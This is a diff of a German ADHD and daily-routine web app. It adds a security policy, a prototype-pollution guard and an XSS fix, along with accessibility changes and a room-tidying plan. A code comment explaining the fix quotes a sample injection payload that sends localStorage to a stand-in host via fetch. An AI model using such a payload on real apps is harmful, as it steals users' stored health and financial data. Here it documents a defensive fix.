@@ -2,7 +2,11 @@
 <html lang="de">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<!-- Zweite Verteidigungslinie: Daten dürfen dieses Gerät nur Richtung
+     Open Food Facts verlassen. Selbst eingeschleuster Code kann damit
+     nichts an einen fremden Server senden. -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob: mediastream:; connect-src 'self' https://world.openfoodfacts.org; object-src 'none'; base-uri 'none'">
 <meta name="theme-color" content="#0b0d10">
 <meta name="mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
@@ -13,7 +17,7 @@
 <style>
 :root{
   --bg:#121620; --surface:#1b212c; --surface2:#242b39; --line:#333c4d;
-  --text:#eef2f8; --muted:#9aa5b6; --dim:#6b7789;
+  --text:#eef2f8; --muted:#9aa5b6; --dim:#8996a8;   /* war #6b7789 — nur 4,0:1 */
   --acc:#4ade80; --acc-dim:#1e3d2b;
   --blue:#63a9f5; --amber:#f5b13d; --red:#f87171; --violet:#ab8cf7;
   --area:#4ade80;
@@ -33,7 +37,7 @@ body[data-ph="night"]    {--ph1:#1a1e2b; --ph2:#171b26; --phc:#9aa5b6}
    Weg benutzt, nicht nur abends im Zimmer. */
 body[data-theme="light"]{
   --bg:#f2f5f9; --surface:#ffffff; --surface2:#eaeff6; --line:#d8e0ea;
-  --text:#111820; --muted:#57657a; --dim:#8391a4;
+  --text:#111820; --muted:#57657a; --dim:#5f6c7e;   /* war #8391a4 — nur 3,2:1 */
   --acc:#0f9d58; --acc-dim:#dcf3e6;
   --blue:#1d6fd4; --amber:#a96108; --red:#c62f2f; --violet:#6d47c7;
   color-scheme:light;
@@ -395,6 +399,16 @@ h2.sect::before{display:none}
   line-height:1;display:inline-flex;align-items:center;justify-content:center;
   vertical-align:middle;margin-left:3px;flex:0 0 auto;padding:0}
 .qm:active{background:var(--acc);color:#06210f}
+/* Tap-Flächen auf mindestens 24 px (WCAG 2.2 AA, 2.5.8). Eine unsichtbare
+   44-px-Fläche wäre hier falsch: .qm sitzt in Karten, die selbst anklickbar
+   sind — die Überlagerung würde deren Taps abfangen. */
+.qm{width:26px;height:26px;font-size:13px}
+.rq{width:30px;height:30px;font-size:14px}
+.tick{width:32px;height:32px}
+.rtick{width:30px;height:30px}
+.x{padding:11px;font-size:18px}
+.btn.sm{min-height:38px}
+.seg button,.seg.seg3 button{min-height:40px}
 
 /* ---------- Ritual-Uhr ---------- */
 .clock{font-size:56px;font-weight:700;letter-spacing:-.03em;text-align:center;
@@ -442,7 +456,7 @@ h2.sect::before{display:none}
    ========================================================================= */
 
 const KEY='pivot.v1';
-const APP_VERSION='5.5';
+const APP_VERSION='5.7';
 const DEF={
   profile:{sex:'m',age:25,height:183,weight:84,pal:1.5,protPerKg:1.8,carbPerKg:5,
            goal:'maintain',kcalOverride:null},
@@ -472,7 +486,10 @@ const DEF={
     rhythm:{}, last:{},// rhythmKey -> ISO
     style:0,           // rotierender Textstil, Aufgabenname bleibt gleich
     rescue:{},         // day -> true
-    zone:'zimmer', size:'std'
+    zone:'zimmer', size:'std',
+    /* V5.7 Zimmerplan — nur Fortschritt, der Inhalt steht als Konstante im Code */
+    zimmer:{aktiv:false, start:null, done:{}, checks:{}, tag:{}, woche:{}, kauf:{},
+            bereich:null, kurz:false, auf:false, aufTag:false, aufOffen:false, aufGen:false}
   },
   fokus:{park:[], log:[], bd:'still'},
   inbox:[],            // {id,t,ts}
@@ -486,21 +503,33 @@ const DEF={
   week:{},             // Wochenblick-Antworten und Beziehungsanker
   reg:{                // Regeneration nach REGENERATION.md
     spieltag:'wechselt', spielDiese:null,
-    hat:{wanne:true, sauna:true, rolle:true, kalt:true},
+    hat:{wanne:true, sauna:true, rolle:true, kalt:true, venen:true},
     done:{}, saunaGeklaert:false
   },
   seen:{}
 };
 
-let S = load();
+/* __proto__, constructor und prototype müssen abgewiesen werden: a['__proto__']=x
+   verändert in JavaScript das Prototyp-Objekt statt eine Eigenschaft anzulegen.
+   Eine präparierte Sicherungsdatei könnte darüber das Verhalten der ganzen
+   App verbiegen.
+   WICHTIG: GIFT und deepMerge müssen VOR "let S = load()" stehen. deepMerge ist
+   als Funktion hochgezogen, GIFT als const aber nicht — stünde load() davor,
+   liefe deepMerge in die temporale Totzone von GIFT, würfe bei jedem Start und
+   load() fiele stumm auf die Standardwerte zurück. Das hat in V5.6 bei jedem
+   Neuladen alle Eingaben gelöscht. Ein Test prüft das jetzt dauerhaft. */
+const GIFT=['__proto__','constructor','prototype'];
+function deepMerge(a,b){ for(const k in b){
+  if(GIFT.includes(k)) continue;
+  if(!Object.prototype.hasOwnProperty.call(b,k)) continue;
+  if(b[k]&&typeof b[k]==='object'&&!Array.isArray(b[k])&&a[k]) deepMerge(a[k],b[k]);
+  else a[k]=b[k]; } return a; }
 function load(){
   try{ const r=JSON.parse(localStorage.getItem(KEY)||'null');
        return r? deepMerge(structuredClone(DEF),r) : structuredClone(DEF); }
   catch(e){ return structuredClone(DEF); }
 }
-function deepMerge(a,b){ for(const k in b){
-  if(b[k]&&typeof b[k]==='object'&&!Array.isArray(b[k])&&a[k]) deepMerge(a[k],b[k]);
-  else a[k]=b[k]; } return a; }
+let S = load();
 let saveT=null;
 function save(){ clearTimeout(saveT); saveT=setTimeout(flush,120); }
 /* Sofort schreiben, wenn die App in den Hintergrund geht oder geschlossen wird —
@@ -526,6 +555,21 @@ function human(s){ const d=parseISO(s); const t=todayISO();
 const r0=n=>Math.round(n), r1=n=>Math.round(n*10)/10;
 const clamp=(v,a,b)=>Math.max(a,Math.min(b,v));
 const esc=s=>String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+
+/* ---------- Nutzerdaten niemals in onclick-Attribute schreiben ----------
+   esc() genügt für Textinhalte, aber NICHT für JavaScript in einem
+   HTML-Attribut. Der HTML-Parser dekodiert &#39; zurück in ein echtes
+   Apostroph, BEVOR der Browser den Handler als JavaScript liest. Ein
+   Aufgabentitel wie   x'); fetch('https://fremd.example?d='+localStorage); //
+   bricht damit aus dem String aus und läuft als Code — mit Zugriff auf
+   den gesamten localStorage, also Medikamente, Journal und Finanzen.
+   Nachgewiesen im Audit vom 10.09.2026.
+
+   Lösung: Der Wert wandert in eine Ablage, ins Attribut kommt nur die
+   Nummer. Damit gibt es keinen Weg mehr von Nutzertext zu Code. */
+let ARGS=[];
+const A=v=>{ ARGS.push(v); return ARGS.length-1; };
+window.$a=i=>ARGS[i];
 const uid=()=>Date.now().toString(36)+Math.random().toString(36).slice(2,7);
 const sum=a=>a.reduce((x,y)=>x+y,0);
 const mean=a=>a.length?sum(a)/a.length:0;
@@ -661,8 +705,19 @@ const WIN=[
   {k:'w4', n:'Abend', off:[600,720], p:.25, c:.30, ico:'🌙',
    why:'Wirkung lässt nach, der Hunger kommt zurück. Vorbereitetes Essen schlägt den Lieferdienst.'}
 ];
+/* Maik: "wenn ich später aufstehe als vorgesehen, passt der tagesrythmus nicht
+   mehr in der app". Sein Export zeigt Einnahmen um 08:47, 11:42 und 13:10 —
+   die Fenster hingen aber fest an 08:15. Jetzt gilt: ist die Einnahme für den
+   Tag eingetragen, sind alle Fenster und Phasen daran verankert. Sonst Plan. */
+function medAnchor(day){
+  const t=(S.med&&S.med.taken&&S.med.taken[day])||null;
+  if(t){ const ts=Object.values(t).filter(x=>/^\d\d?:\d\d$/.test(x)).sort();
+    if(ts.length) return hm2m(ts[0]); }
+  return hm2m(S.adhs.medTime||'08:15'); }
+function medAnchorLabel(day){ const a=medAnchor(day), p=hm2m(S.adhs.medTime||'08:15');
+  return a===p ? 'Einnahme '+S.adhs.medTime : 'Einnahme '+m2hm(a)+' — Fenster verschoben'; }
 function windowsFor(day){
-  const base=hm2m(S.adhs.medTime||'08:15');
+  const base=medAnchor(day);
   const past = day<todayISO();
   const now = nowMin();
   return WIN.map(w=>{
@@ -717,7 +772,7 @@ const RULE_SEED=[
   {wenn:'ich um 15 Uhr durchhänge', dann:'gehe ich fünf Minuten vor die Tür ins Licht', trigger:'dip'}
 ];
 function activeRules(day){
-  const now=nowMin(), base=hm2m(S.adhs.medTime||'08:15');
+  const now=nowMin(), base=medAnchor(day);
   const trained=sessionsOn(day).length>0;
   const missed=windowsFor(day).some(w=>w.status==='missed');
   return S.adhs.rules.filter(r=>{
@@ -976,7 +1031,7 @@ const PARENT={haus:'more', fokus:'more', inbox:'more', tools:'more', load:'more'
 let VIEW='now', trainSeg='ses';
 
 function phase(){
-  const n=nowMin(), w=hm2m(S.adhs.wake||'08:00'), m=hm2m(S.adhs.medTime||'08:15');
+  const n=nowMin(), w=hm2m(S.adhs.wake||'08:00'), m=medAnchor(todayISO());
   if(n < w-45) return 'night';
   if(n < m+150) return 'morning';
   if(n < 900)   return 'midday';
@@ -996,26 +1051,45 @@ const PHASE={
 function renderNav(){
   const act=PARENT[VIEW]||VIEW;
   document.getElementById('nav').innerHTML=TABS.map(([k,l])=>
-    `<button data-t="${k}" class="${act===k?'on':''}">
-      <svg viewBox="0 0 24 24">${ICON[k]}</svg><span>${l}</span></button>`).join('');
+    `<button data-t="${k}" class="${act===k?'on':''}"
+      ${act===k?'aria-current="page"':''} aria-label="${l}">
+      <svg viewBox="0 0 24 24" aria-hidden="true">${ICON[k]}</svg><span>${l}</span></button>`).join('');
 }
 document.getElementById('nav').addEventListener('click',e=>{
   const b=e.target.closest('button[data-t]'); if(!b) return;
   stopScan(); VIEW=b.dataset.t; render(); window.scrollTo(0,0);
+  if(VIEW!=='now') navPush();
 });
 document.getElementById('dateBtn').addEventListener('click',()=>openSheet(dateSheet()));
 document.getElementById('backBtn').addEventListener('click',()=>go('more'));
 window.go=(v,seg)=>{ if(v!=='journal') JD=null;
   if(v!=='notfall'){ notCur=null; notPool=[]; }
-  VIEW=v; if(seg) trainSeg=seg; closeSheet(); render(); window.scrollTo(0,0); };
+  VIEW=v; if(seg) trainSeg=seg; closeSheet(); render(); window.scrollTo(0,0);
+  if(v!=='now') navPush(); };
+
+/* Maik: "zurück knopf auf dem handy schmeißt mich aus der app". Eine PWA hat
+   ohne eigene Verlaufseinträge nichts, wohin sie zurückgehen könnte — also
+   schließt Android sie. Jeder Wechsel in einen Bereich oder ein Fenster legt
+   deshalb einen Eintrag an; Zurück geht dann erst zum Elternreiter, dann zur
+   Startseite, und erst von dort hinaus. */
+function navPush(){ try{ history.pushState({pivot:1},''); }catch(e){} }
+try{ history.replaceState({pivot:0},''); }catch(e){}
+window.addEventListener('popstate',()=>{
+  if(sheetEl.classList.contains('on')){ closeSheet(); navPush(); return; }
+  if(VIEW!=='now'){ VIEW=PARENT[VIEW]||'now'; stopScan(); render(); window.scrollTo(0,0);
+    if(VIEW!=='now') navPush(); }
+});
 window.setSeg=v=>{ trainSeg=v; render(); };
 
 /* Sheet */
 const sheetEl=document.getElementById('sheet'), bgEl=document.getElementById('sheetBg');
 function openSheet(html){ document.getElementById('sheetBody').innerHTML=html;
+  if(!sheetEl.classList.contains('on')) navPush();
   sheetEl.classList.add('on'); bgEl.classList.add('on'); }
 function closeSheet(){ sheetEl.classList.remove('on'); bgEl.classList.remove('on'); stopScan(); }
-bgEl.addEventListener('click',closeSheet);
+/* Beim Tippen neben das Fenster lief der Timer unsichtbar weiter und
+   protokollierte am Ende nichts. Jetzt wird er sauber beendet. */
+bgEl.addEventListener('click',()=>{ if(TIMER) stopFocus(); else closeSheet(); });
 window.closeSheet=closeSheet;
 
 function dateSheet(){
@@ -1032,6 +1106,7 @@ function dateSheet(){
 window.setDay=d=>{ if(d){DAY=d; closeSheet(); render();} };
 
 function render(){
+  ARGS=[];                      /* Ablage gehört zu genau einem Aufbau */
   document.body.dataset.ph=phase();
   document.documentElement.style.setProperty('--area', AREA[VIEW]);
   renderNav();
@@ -1158,7 +1233,7 @@ function vNow(){
       <div class="small muted" style="margin-bottom:11px">Du hast trainiert. Direkt nach Belastung
         ist die Chance auf eine gute Konzentrationsphase erhöht${fw.task?` — ${esc(fw.task.t)} wäre dran`:''}.</div>
       <div class="btnrow">
-        <button class="btn sm acc" onclick="${fw.task?`startRitual('${esc(fw.task.first||fw.task.t).replace(/'/g,'')}')`:`openSheet(taskSheet())`}">Zwei Minuten starten</button>
+        <button class="btn sm acc" onclick="${fw.task?`startRitual($a(${A(fw.task.first||fw.task.t)}))`:`openSheet(taskSheet())`}">Zwei Minuten starten</button>
         <button class="btn sm ghost" onclick="useFocus()">Später</button></div></div>`;
   }
 
@@ -1178,7 +1253,7 @@ function vNow(){
         <div class="item" style="padding:4px 0"><button class="tick" onclick="tickTask(${tasks.indexOf(t)})"></button>
           <div class="g"><b>${esc(t.t)}</b><span>${t.first?'Start: '+esc(t.first):''}</span></div></div>
         <div class="spacer"></div>
-        <button class="btn acc" onclick="startRitual('${esc(t.first||t.t).replace(/'/g,'')}')">Zwei Minuten starten</button>
+        <button class="btn acc" onclick="startRitual($a(${A(t.first||t.t)}))">Zwei Minuten starten</button>
       </div>`;
     } else {
       h+=`<div class="card"><h2>Keine Aufgabe gesetzt</h2>
@@ -1322,12 +1397,18 @@ function vTag(){
   let h=dayBar(DAY);
 
   if(rd){
-    const col = rd.score>=60?'var(--acc)':rd.score>=40?'var(--amber)':'var(--red)';
+    /* Rot war für einen Wert reserviert, der ausdrücklich kein Gesundheitswert
+       ist — das liest sich wie ein Befund. Rot bleibt echten Warnungen
+       vorbehalten (Serotonin-Hinweis, leerer Medikamentenbestand). */
+    const col = rd.score>=60?'var(--acc)':rd.score>=40?'var(--amber)':'var(--blue)';
     const txt = rd.score>=60?'Über deinem Normalwert':rd.score>=40?'Im normalen Bereich':'Unter deinem Normalwert';
+    /* Rot ohne Erklärung liest sich wie ein Gesundheitsbefund. Der Hinweis
+       stand bisher nur hinter dem Fragezeichen — dort sieht ihn niemand. */
     h+=`<div class="card"><div class="ready">
       ${ring(rd.score,col,rd.score,'Bereit')}
       <div style="flex:1">
         <div style="font-weight:640;font-size:15px;margin-bottom:3px">${txt} ${Q('bereit')}</div>
+        <div class="xs dim" style="margin-bottom:3px">Kein Gesundheitswert — Vergleich mit deinem eigenen Schnitt</div>
         <div class="small muted">Hooper ${rd.hooper}/28${rd.base?` · Schnitt ${r1(rd.base.m)}`:''}</div>
         <div class="chips" style="margin-top:9px">
           ${HOOP.map(x=>`<span class="pill xs">${x.s} ${S.well[DAY][x.k]}</span>`).join('')}</div>
@@ -1358,7 +1439,7 @@ function vTag(){
           <b>${esc(t.t)}</b>
           <span>${t.first?'Start: '+esc(t.first):''}${t.slot?' · '+SLOTS[t.slot]:''}</span></div>
         ${t.done?'':`<button class="btn sm acc" style="padding:6px 9px;font-size:11.5px"
-          onclick="startRitual('${esc(t.first||t.t).replace(/'/g,'')}')">2 Min</button>`}
+          onclick="startRitual($a(${A(t.first||t.t)}))">2 Min</button>`}
         <button class="x" onclick="delTask(${i})">✕</button></div>
       ${t.slot==='nach'&&!t.done?`<div class="warn">Nachmittag ist deine schwächste Phase.
         Wenn das wirklich passieren soll, zieh es auf den Vormittag.</div>`:''}`).join('')
@@ -1427,11 +1508,11 @@ function dayBar(day){
       <div class="dip" style="left:${dipA}%;width:${Math.max(dipB-dipA,0)}%"></div>
       ${wins.map(x=>`<div class="wblk ${x.status}" title="${x.n}"
         style="left:${pos(x.from)}%;width:${Math.max(pos(x.to)-pos(x.from),1.5)}%"></div>`).join('')}
-      <div class="mark med" style="left:${pos(hm2m(S.adhs.medTime))}%"></div>
+      <div class="mark med" style="left:${pos(medAnchor(day))}%"></div>
       ${showNow?`<div class="nowline" style="left:${pos(now>=w?now:now+1440)}%"></div>`:''}
     </div>
     <div class="row between xs dim" style="margin-top:6px">
-      <span>Einnahme ${S.adhs.medTime}</span>
+      <span>${medAnchorLabel(day)}</span>
       <span style="color:var(--amber)">Tief 15–17</span>
       <span>Bett ${S.adhs.bed}</span></div>
   </div>`;
@@ -1706,7 +1787,7 @@ function vFood(){
   ${S.adhs.useWindows?`<div class="card">
     <div class="row between" style="margin-bottom:10px">
       <h2 style="margin:0">Essensfenster ${Q('fenster')}</h2>
-      <span class="xs dim">Einnahme ${S.adhs.medTime}</span></div>
+      <span class="xs dim">${medAnchorLabel(DAY)}</span></div>
     ${windowsFor(DAY).map(w=>{
       const st={open:'',now:'now',done:'done',skip:'skip',missed:'missed'}[w.status];
       const lbl={open:'',now:'jetzt',done:'erledigt',skip:'übersprungen',missed:'verstrichen'}[w.status];
@@ -1925,7 +2006,7 @@ function manualSheet(bc,unknown){
     <label class="f"><span>Kohlenhydrate</span><input type="number" id="mC" inputmode="decimal"></label>
     <label class="f"><span>Fett</span><input type="number" id="mF" inputmode="decimal"></label>
   </div>
-  <button class="btn acc" onclick="manualNext('${esc(bc||'')}')">Weiter</button>`;
+  <button class="btn acc" onclick="manualNext($a(${A(bc||'')}))">Weiter</button>`;
 }
 window.manualNext=bc=>{
   const g=id=>parseFloat(document.getElementById(id).value)||0;
@@ -2376,7 +2457,7 @@ const AREAS=[
   {k:'journal',n:'Reflexion',      ico:'📓', c:'#4ade80',
    z:'Drei Fragen abends, dann Schluss'},
   {k:'haus',   n:'Haushalt',       ico:'🧹', c:'#f5b13d',
-   z:'Immer genau ein nächster Schritt'},
+   z:'Zimmerplan — immer genau ein nächster Schritt'},
   {k:'beschw', n:'Beschwerden',    ico:'🩹', c:'#f87171',
    z:'Schmerz erfassen, bevor Training ausfällt'},
   {k:'fin',    n:'Finanzen',       ico:'💶', c:'#f5b13d',
@@ -2410,8 +2491,11 @@ function areaUsed(k){
 function areaBadge(k){
   switch(k){
     case 'inbox': return S.inbox.length||0;
-    case 'haus': { const Z=ZONE[S.haus.zone||'zimmer'];
-      return Z.steps.filter(s=>!hausDone(DAY,s.id)).length; }
+    case 'haus': {
+      /* Der Bereich zeigt bewusst immer nur EINEN nächsten Schritt. Eine
+         Zahl bis 10 auf der Kachel war genau die Rückstandswand, die die
+         App vermeiden soll. */
+      return hausNext() ? 1 : 0; }
     case 'fin': return S.fin.wish.filter(w=>w.status==='warten'&&Date.now()>=w.bis).length
                      + S.fin.bills.filter(b=>!b.bezahlt&&b.faellig<=todayISO()).length;
     case 'med': { const M=meds();
@@ -2422,9 +2506,12 @@ function areaBadge(k){
   }
 }
 function tiles(list){
+  /* aria-label trägt die Zweckzeile mit, damit auch ohne sichtbaren Text
+     klar ist, wohin die Kachel führt. */
   return `<div class="tiles">${list.map(a=>{const b=areaBadge(a.k);
-    return `<button class="tile" onclick="go('${a.k}')" style="--tc:${a.c}">
-      <span class="ti">${a.ico}</span><span class="tn">${a.n}</span>
+    return `<button class="tile" onclick="go('${a.k}')" style="--tc:${a.c}"
+      aria-label="${esc(a.n)} — ${esc(a.z||'')}">
+      <span class="ti" aria-hidden="true">${a.ico}</span><span class="tn">${a.n}</span>
       ${b?`<span class="tb">${b}</span>`:''}</button>`;}).join('')}</div>`;
 }
 /* Als Liste mit Zweckzeile statt als Symbolwand — das war Maiks Kritik
@@ -2596,6 +2683,7 @@ function hausNext(){
     const s=RESCUE.find(x=>!hausDone(DAY,x.id+'@'+DAY));
     return s?{s, quelle:'Rettungsmodus', key:s.id+'@'+DAY}:null;
   }
+  const zp=zpHausNext(); if(zp) return zp;
   if(S.haus.reset.active){
     const blk=RESET.find(b=>b.d===S.haus.reset.day);
     if(blk){ const s=blk.steps.find(x=>!hausDone('reset',x.id));
@@ -2710,6 +2798,462 @@ window.tipp=k=>{ const t=TIPP[k]; if(!t) return;
     ${t.safe?`<div class="warn">${t.safe}</div><div class="spacer"></div>`:''}
     <button class="btn" onclick="closeSheet()">Zurück</button>`); };
 
+/* =========================================================================
+   ZIMMERPLAN — 35 Schritte für genau dieses Zimmer, in fester Reihenfolge.
+
+   Inhalt kommt aus der Spezifikation vom 09.09.2026 (25 Fotos, Obsidian,
+   belegte Recherche). Der Inhalt liegt hier als Konstante, NICHT in S:
+   deepMerge übernimmt gespeicherte Arrays vollständig, ein späterer
+   Textwechsel käme sonst nie beim Nutzer an. In S steht nur der Fortschritt.
+
+   Regeln aus der App, die hier gelten:
+   - immer nur EIN nächster Schritt, nie die Liste zuerst
+   - „Fertig“ zählt auch, wenn nicht alle Haken gesetzt sind
+   - kurze Fassung zählt genauso wie die lange
+   - 15–17 Uhr: nur die kurze Fassung
+   - ab 22:30: die Abendrunde statt eines großen Schritts
+   - keine Serie, kein Zähler in Folge — nur „zuletzt“
+   ========================================================================= */
+const ZP_BER=[
+  {id:'A', n:'Strom und Kabel',            warum:'Der einzige Punkt mit echtem Risiko'},
+  {id:'B', n:'Müll, Essen, Getränke',      warum:'Verderblich, deshalb zuerst'},
+  {id:'C', n:'Boden freimachen',           warum:'Größter sichtbarer Effekt pro Minute'},
+  {id:'D', n:'Kleidung',                   warum:'Größter Einzelposten, die Kleiderstange ist leer'},
+  {id:'E', n:'Schreibtisch am Fenster',    warum:'Frist: Studienstart 15. September'},
+  {id:'F', n:'Gaming-Platz',               warum:'Kein Zeitdruck, schnell erledigt'},
+  {id:'G', n:'Nachttisch und Schubladen',  warum:'Viele Entscheidungen, gehört nach hinten'},
+  {id:'H', n:'Dokumente',                  warum:'Die meisten Entscheidungen pro Minute'},
+  {id:'I', n:'Handball, Bücher, Regal',    warum:'Stört den Alltag nicht'},
+  {id:'J', n:'Reinigen',                   warum:'Zuletzt, sonst doppelte Arbeit'}
+];
+
+/* min = netto, slot = min × 2,5 (Maiks Pufferregel). not = kurze Fassung. */
+const ZP=[
+  {id:'A1',b:'A',t:'Steckdosenleiste hinter dem Bett',min:10,
+   c:['Flaschen und Textilien rund um die Leiste wegnehmen',
+      'Leiste vom Teppich auf harten Boden oder an die Wand',
+      'Prüfen: stecken zwei Leisten hintereinander? Dann die zweite ausstecken',
+      'Kabel im Laufweg von der Tür an die Wandkante schieben'],
+   not:'Nur Flaschen weg und Leiste vom Teppich.',
+   nach:'Der einzige Schritt mit echtem Risiko ist erledigt. Alles weitere ist Ordnung.'},
+  {id:'A2',b:'A',t:'Steckdosenleiste unter dem Schreibtisch',min:10,
+   c:['Textilien rund um die Leiste wegnehmen',
+      'Leiste auf harten Boden oder an die Zarge',
+      'Prüfen: hängt sie in einer anderen Leiste? Dann direkt in die Wand',
+      'Stecker ziehen, die nichts mehr versorgen'],
+   not:'Nur die Textilien weg.'},
+  {id:'A3',b:'A',t:'Kabel auf Regal und Wandregal',min:12,
+   c:['Textilien von den Kabeln nehmen',
+      'Lose Kabel und Netzteile in eine leere weiße Box',
+      'Kabel, die in Benutzung sind, an die Wandkante legen'],
+   not:'Nur die Textilien von den Kabeln nehmen.'},
+  {id:'A4',b:'A',t:'Bücher über dem Kopfende',min:5,
+   c:['Bücher vom Regal über dem Kopfende nehmen',
+      'Ins mittlere Bücherregalfach stellen'],
+   not:null,
+   nach:'Nichts liegt mehr über dem Kopf. Bereich A ist durch.'},
+
+  {id:'B1',b:'B',t:'Essen und Getränke raus',min:10,
+   c:['Alle Flaschen, Gläser, Becher einsammeln',
+      'Schüssel und Snacktüte in die Küche',
+      'Ab jetzt: ein Platz für Getränke, seitlich neben der Tastatur'],
+   not:'Nur Schüssel und Snacktüte.'},
+  {id:'B2',b:'B',t:'Müll',min:10,
+   c:['Papierkorb leeren',
+      'Taschentücher, Verpackungen, Kassenzettel — einmal im Kreis',
+      'Beutel zubinden und gleich zur Tonne'],
+   not:'Nur Papierkorb und Taschentücher.'},
+  {id:'B3',b:'B',t:'Spraydose und Batterie',min:3,
+   c:['Spraydose aus dem Zimmer — leer in die Wertstofftonne, voll in den Schrank',
+      'Batterie in die Batteriebox oder zum Sammelbehälter im Supermarkt'],
+   not:null,
+   nach:'Nichts Verderbliches mehr im Zimmer. Bereich B ist durch.'},
+
+  {id:'C1',b:'C',t:'Boden — Bettzone',min:12,
+   c:['Alles vom Boden um das Bett in eine Kiste',
+      'Sortieren in sechs Haufen: Müll, Wäsche, sauber, gehört woanders hin, hat hier einen Platz, prüfen',
+      'Müll weg, Wäsche in den Korb, „woanders hin“ vor die Tür'],
+   not:'Alles in eine Kiste, nicht sortieren.',
+   nach:'Das erste Stück Boden ist frei. Das ist der Schritt mit dem größten Effekt.'},
+  {id:'C2',b:'C',t:'Boden — Schreibtischzone',min:12,
+   c:['Alles vom Boden unter und um den Schreibtisch aufnehmen',
+      'Dieselben sechs Haufen',
+      '„Prüfen“-Sachen in eine Kiste unter das Bett'],
+   not:'Nur die Textilien vom Boden.'},
+  {id:'C3',b:'C',t:'Bett, Sessel, Wäschekorb',min:10,
+   c:['Bett abräumen und Decke glatt',
+      'Sessel: alles runter, was nicht „getragen, noch nicht schmutzig“ ist',
+      'Wäschekorb: was nass ist, erst offen trocknen lassen'],
+   not:'Nur das Bett.',
+   nach:'Boden, Bett und Sessel sind frei. Bereich C ist durch.'},
+
+  {id:'D1',b:'D',t:'Kleiderstange in Betrieb nehmen',min:15,
+   c:['Bügel bereitlegen (Einkaufsliste, falls keine da sind)',
+      'Hemden, Hosen und Trainingsjacken auf Bügel',
+      'Alles auf die Stange im Schrank'],
+   not:'Nur Jacken und Hosen aufhängen.',
+   nach:'Die Stange war zu hundert Prozent leer. Nächstes Mal siehst du direkt, wie viel Platz das war.'},
+  {id:'D2',b:'D',t:'Sessel bekommt einen Zweck',min:10,
+   c:['Entscheiden: Sessel ODER linke Hälfte vom mittleren Schrankboden für „getragen, nochmal“',
+      'Den anderen Ort leerräumen',
+      'Ab jetzt gibt es genau diesen einen Ort'],
+   not:'Nur die Entscheidung treffen.'},
+  {id:'D3',b:'D',t:'Schublade 13 entlasten',min:15,
+   c:['Überhängende Teile herausnehmen',
+      'T-Shirts und Pullover gefaltet ins Fach für dunkle Kleidung',
+      'Schublade muss ohne Drücken zugehen'],
+   not:'Nur die überhängenden Teile.'},
+  {id:'D4',b:'D',t:'Mischfach 12 trennen',min:15,
+   c:['Alles raus',
+      'Unterwäsche in den linken Kartoneinsatz, Socken in den rechten',
+      'Socken paaren, Einlegesohlen zusammenlegen',
+      'Was nicht dazugehört, an seinen Ort'],
+   not:'Nur Einlegesohlen und Socken paaren.'},
+  {id:'D5',b:'D',t:'Sportgarnituren zählen',min:5,
+   c:['Vollständige Sportgarnituren zählen',
+      'Unter fünf: das ist ein Mengenproblem, kein Ordnungsproblem — notieren'],
+   not:null,
+   nach:'Kleidung hat jetzt einen Ort. Bereich D ist durch.'},
+
+  {id:'E1',b:'E',t:'Schreibtisch leeren',min:12,
+   c:['Alles vom Schreibtisch in eine Kiste',
+      'Fläche einmal trocken abwischen',
+      'Zurück kommt nur, was jeden Tag gebraucht wird'],
+   not:'Nur die rechte Hälfte.'},
+  {id:'E2',b:'E',t:'Lernplatz einrichten',min:12,
+   c:['Laptop, ein Buch, ein Stift, ein Block — mehr nicht',
+      'Ein Köcher mit Stiften, der Rest in den Rollcontainer',
+      'Karteikartenbox auf den Schreibtisch',
+      'Getränkeplatz seitlich neben der Tastatur'],
+   not:'Nur Laptop, Buch, Stift, Papier.',
+   nach:'Der Platz fürs Studium steht. Das war der Schritt mit der Frist.'},
+  {id:'E3',b:'E',t:'Kiste sortieren, erste Hälfte',min:12,
+   c:['Stifte zusammenlegen, Köcher füllen, Rest in den Rollcontainer',
+      'Büromaterial in die schwarze Schublade des Rollcontainers',
+      'Bastelmaterial in den Weidenkorb unter dem Schreibtisch'],
+   not:'Nur die Stifte zusammenlegen.'},
+  {id:'E4',b:'E',t:'Kiste sortieren, zweite Hälfte',min:12,
+   c:['Lose Blätter in eine Mappe',
+      'Kabel und Netzteile in die weiße Box',
+      'Kleinteile ins Sortier-Tablett auf dem Sideboard',
+      'Rest: prüfen-Kiste unter dem Bett'],
+   not:'Nur die losen Blätter in eine Mappe.',
+   nach:'Bereich E ist durch — der Schreibtisch bleibt jetzt frei, wenn abends alles zurückgeht.'},
+
+  {id:'F1',b:'F',t:'Mauspad frei',min:12,
+   c:['Alles vom Mauspad in eine Schale',
+      'Kleinteile ins Sortier-Tablett',
+      'Nur Maus und Tastatur bleiben'],
+   not:'Alles in eine Schale.'},
+  {id:'F2',b:'F',t:'Sideboard',min:10,
+   c:['Getränke runter',
+      'Fläche frei bis auf das Sortier-Tablett',
+      'Trocken abwischen'],
+   not:'Nur die Getränke.',
+   nach:'Gaming-Platz fertig. Bereich F ist durch.'},
+
+  {id:'G1',b:'G',t:'Nachttisch — Oberseite',min:10,
+   c:['Flasche und Glas in die Küche',
+      'Pflegeprodukte in die Bambusbox',
+      'Oberseite trocken abwischen'],
+   not:'Nur Flasche und Glas.'},
+  {id:'G2',b:'G',t:'Nachttisch — Schublade 1',min:15,
+   c:['Alles raus',
+      'Maßband und Stifte an ihren Ort',
+      'Medikamente: Blister im Umkarton, hier oder im Rollcontainer — nichts wegwerfen, nur einräumen',
+      'Rest: prüfen-Kiste'],
+   not:'Nur Maßband und Stifte.'},
+  {id:'G3',b:'G',t:'Nachttisch — Schublade 2',min:10,
+   c:['Kabel raus in die weiße Box',
+      'Inhalt in einen geschlossenen, abwischbaren Behälter',
+      'Schublade zu'],
+   not:'Nur die Kabel raus.',
+   nach:'Nachttisch fertig. Bereich G ist durch.'},
+
+  {id:'H1',b:'H',t:'Hängeregistratur beschriften',min:12,
+   c:['Fünf Mappen, fünf Reiter: Studium, Verein, Versicherung und Bank, Gesundheit, Sonstiges',
+      'Registratur aufs Regal statt auf den Boden'],
+   not:'Nur die fünf Reiter beschriften.'},
